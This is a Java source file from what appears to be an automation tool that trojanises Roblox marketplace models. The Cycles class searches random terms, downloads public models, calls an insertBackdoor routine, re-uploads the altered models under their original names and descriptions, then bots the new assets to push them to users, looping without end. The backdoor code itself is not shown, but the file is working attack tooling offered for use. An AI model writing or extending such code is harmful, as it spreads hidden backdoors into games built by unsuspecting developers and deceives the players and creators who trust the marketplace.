package com.roblox.botting;

import com.company.Options;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.roblox.classes.Model;
import com.roblox.misc.FileManipulation;
import com.roblox.misc.State;
import com.roblox.requests.Resources;
import org.apache.commons.configuration.ConfigurationException;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import java.util.List;
import java.util.Random;
import java.util.concurrent.atomic.AtomicLong;

@SuppressWarnings("unused")
public class Cycles {
    private final Options options = new Options();
    private final Random random = new Random();
    private Resources resources = null;
    private State state = State.INITIALIZING;

    public Cycles() throws IOException, ConfigurationException {}

    public void start(Resources resources) throws IOException, ParserConfigurationException, SAXException, NoSuchMethodException, ConfigurationException, InterruptedException {
        this.resources = resources;
        this.state = State.FINDING_ASSET;
        this.findRandomAssetAndStartLoop();
    }

    private void findRandomAssetAndStartLoop() throws IOException, ParserConfigurationException, SAXException, NoSuchMethodException, ConfigurationException, InterruptedException {
        char randomCharacter = this.generateRandomChar();
        JsonObject match = this.resources.lookupSuggestions(String.valueOf(randomCharacter), 35, 1);
        this.findMatch(match.get("Query").getAsString());
    }

    private void findMatch(String name) throws IOException, ParserConfigurationException, SAXException, NoSuchMethodException, ConfigurationException, InterruptedException {
        System.out.printf("Searching for %s!\n", name);

        JsonArray searchResults = this.resources.searchAssets(name, "50");
        String assetId = null;
        String assetName = null;
        String assetDescription = null;
        String assetData = null;

        for(JsonElement element : searchResults) {
            JsonObject jsonObject = element.getAsJsonObject();
            String assetInfo = resources.downloadAsset(jsonObject.get("AssetId").getAsString());

            if(!assetInfo.startsWith("<roblox!")) { // checking if its valid xml
                assetId = jsonObject.get("AssetId").getAsString();
                assetName = jsonObject.get("Name").getAsString();
                assetDescription = jsonObject.get("Description").getAsString();
                assetData = assetInfo;
            }
        }

        if(assetId == null) {
            System.out.println("Failed to find an asset in rbxmx format");
            this.findRandomAssetAndStartLoop();
        }

        System.out.printf("Targeting \"%s\"\n", assetName);
        String assetDataBackdoored = this.insertBackdoor(assetData);

        String[] responseCode = this.resources.uploadAsset(assetName, assetDescription,
                assetDataBackdoored);

        if(responseCode[0].equals("200"))
            System.out.printf("Successfully uploaded backdoored model! The asset id is %s\n", responseCode[1]);
        else
            System.out.println("Failed to upload backdoored model");

        this.botModel(responseCode[1]);
    }

    private void botModel(String assetId) throws IOException, ParserConfigurationException, SAXException, NoSuchMethodException, ConfigurationException, InterruptedException {
        Botter botter = new Botter(Botters.class.getMethod("modelBot", Model.class, List.class, List.class,
                long.class, AtomicLong.class), assetId,
                Integer.parseInt(this.options.readProperty("SizePerChunk")));

        this.findRandomAssetAndStartLoop();
    }

    private String insertBackdoor(String assetXml) throws IOException, ParserConfigurationException, SAXException {
        FileManipulation fileManipulation = new FileManipulation(assetXml);

        return fileManipulation.insertBackdoor();
    }

    private char generateRandomChar() {
        return (char) (this.random.nextInt(26) + 'a');
    }

    public State getState() {
        return this.state;
    }
}
